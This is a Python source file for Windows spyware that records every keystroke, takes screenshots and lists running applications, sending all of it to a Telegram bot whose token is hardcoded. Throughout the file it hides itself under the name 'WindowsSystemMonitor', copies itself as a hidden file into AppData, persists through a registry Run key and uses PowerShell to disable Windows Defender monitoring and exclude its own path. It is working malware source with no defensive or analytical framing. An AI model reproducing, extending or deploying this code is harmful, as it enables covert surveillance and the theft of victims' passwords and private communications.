import pynput.keyboard
import threading
import requests
import telegram
import time
import os
import sys
import psutil
from PIL import ImageGrab
import platform
import subprocess
import json
import winreg
import shutil
import tempfile
import base64
import ctypes
from ctypes import wintypes

# Telegram bot configuration
BOT_TOKEN = "8677222782:AAH8zeSsjsS6QSyEnCVdfMd_ZiHXkqjD-FI"
CHAT_ID = "8677222782"

# Initialize Telegram bot
bot = telegram.Bot(token=BOT_TOKEN)

# Keylogger variables
log = ""
screenshot_interval = 300  # 5 minutes in seconds
app_name = "WindowsSystemMonitor"
hidden_file_path = os.path.join(os.environ["APPDATA"], app_name + ".exe")

# Stealth techniques
def hide_console():
    # Hide the console window
    ctypes.windll.kernel32.FreeConsole()
    
def add_to_startup():
    try:
        # Add to Windows registry startup
        key = winreg.HKEY_CURRENT_USER
        sub_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, app_name, 0, winreg.REG_SZ, hidden_file_path)
        return True
    except Exception as e:
        print(f"Error adding to startup: {e}")
        return False

def create_hidden_copy():
    try:
        # Create a hidden copy of the script in AppData
        if not os.path.exists(hidden_file_path):
            shutil.copy2(sys.executable, hidden_file_path)
            # Set file to hidden
            ctypes.windll.kernel32.SetFileAttributesW(hidden_file_path, 2)  # 2 = FILE_ATTRIBUTE_HIDDEN
        return True
    except Exception as e:
        print(f"Error creating hidden copy: {e}")
        return False

def disable_windows_defender():
    try:
        # Try to disable Windows Defender real-time monitoring
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 
                      shell=True, capture_output=True)
        # Add exclusion for our file
        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{hidden_file_path}\'"', 
                      shell=True, capture_output=True)
        return True
    except Exception as e:
        print(f"Error disabling Windows Defender: {e}")
        return False

def check_if_already_running():
    # Check if another instance is already running
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['pid'] != current_pid and proc.info['name'] == os.path.basename(sys.executable):
                if len(proc.info['cmdline']) > 1 and app_name in " ".join(proc.info['cmdline']):
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return False

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
        else:
            log += " [" + str(key) + "] "

def get_active_applications():
    apps = []
    if platform.system() == "Windows":
        import win32gui
        def window_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                windows.append({
                    'title': win32gui.GetWindowText(hwnd),
                    'pid': win32gui.GetWindowThreadProcessId(hwnd)[1]
                })
            return True
        windows = []
        win32gui.EnumWindows(window_callback, windows)
        
        for window in windows:
            try:
                pid = window['pid']
                process = psutil.Process(pid)
                apps.append({
                    'name': process.name(),
                    'title': window['title'],
                    'pid': pid,
                    'cpu': process.cpu_percent(),
                    'memory': process.memory_info().rss / (1024 * 1024)  # MB
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    else:
        # For Linux/Mac
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                apps.append({
                    'name': proc.info['name'],
                    'pid': proc.info['pid'],
                    'cpu': proc.info['cpu_percent'],
                    'memory': proc.info['memory_info'].rss / (1024 * 1024)  # MB
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    
    return apps

def take_screenshot():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(tempfile.gettempdir(), f"screenshot_{timestamp}.png")
    
    screenshot = ImageGrab.grab()
    screenshot.save(filename)
    return filename

def send_screenshot(filename):
    try:
        with open(filename, 'rb') as photo:
            bot.send_photo(chat_id=CHAT_ID, photo=photo)
        os.remove(filename)  # Clean up after sending
        return True
    except Exception as e:
        print(f"Error sending screenshot: {e}")
        return False

def send_applications_info(apps):
    try:
        # Format application info
        app_info = "Active Applications:\n\n"
        for app in apps[:10]:  # Limit to top 10 apps
            app_info += f"Name: {app['name']}\n"
            if 'title' in app:
                app_info += f"Title: {app['title']}\n"
            app_info += f"PID: {app['pid']}\n"
            app_info += f"CPU: {app['cpu']}%\n"
            app_info += f"Memory: {app['memory']:.2f} MB\n\n"
        
        bot.send_message(chat_id=CHAT_ID, text=app_info)
        return True
    except Exception as e:
        print(f"Error sending app info: {e}")
        return False

def send_log():
    global log
    if log:
        try:
            bot.send_message(chat_id=CHAT_ID, text=f"Keylog:\n{log}")
            log = ""
        except Exception as e:
            print(f"Error sending log: {e}")

def monitor_system():
    while True:
        # Take screenshot
        screenshot_file = take_screenshot()
        send_screenshot(screenshot_file)
        
        # Get active applications
        apps = get_active_applications()
        send_applications_info(apps)
        
        # Send any accumulated keystrokes
        send_log()
        
        # Wait for the next interval
        time.sleep(screenshot_interval)

def report():
    global log
    send_log()
    timer = threading.Timer(30, report)  # Send logs every 30 seconds
    timer.daemon = True
    timer.start()

def start_monitoring():
    # Start keylogger thread
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    keyboard_thread = threading.Thread(target=keyboard_listener.start)
    keyboard_thread.daemon = True
    keyboard_thread.start()
    
    # Start periodic reporting thread
    report()
    
    # Start system monitoring thread
    monitor_thread = threading.Thread(target=monitor_system)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Monitoring stopped")

def initialize_stealth():
    # Check if already running
    if check_if_already_running():
        sys.exit(0)
    
    # Create hidden copy and add to startup
    create_hidden_copy()
    add_to_startup()
    
    # Try to disable Windows Defender
    disable_windows_defender()
    
    # Hide console window
    hide_console()

if __name__ == "__main__":
    # Initialize stealth features
    initialize_stealth()
    
    # Start monitoring
    start_monitoring()
